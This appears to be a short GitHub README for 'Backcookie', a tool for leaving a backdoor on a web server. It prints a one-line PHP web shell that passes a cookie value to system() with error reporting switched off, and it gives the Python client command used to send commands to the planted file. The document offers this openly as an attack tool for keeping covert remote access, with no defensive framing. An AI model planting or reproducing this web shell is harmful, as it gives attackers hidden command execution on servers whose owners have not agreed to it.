# Backcookie
It is a tool that allows you to leave a backdoor on a given file on a web server in PHP,ASP,ASPX,JSP, through the connection between the server and the cookie (which works as an access key).

## PHP
Put this script in a PHP file on the web server.

```sh
<?php error_reporting(0); system($_COOKIE["browser"]); ?>
```

## Execution

We must specify the url with the file, and then the cookie.

```sh
python3 backcookie.py -d 'http://192.168.219.130/sistema/test.php' -c browser
```

![image](https://user-images.githubusercontent.com/66162160/217388824-5aa01fb7-ae6e-4729-ae7b-e52f43f60557.png)
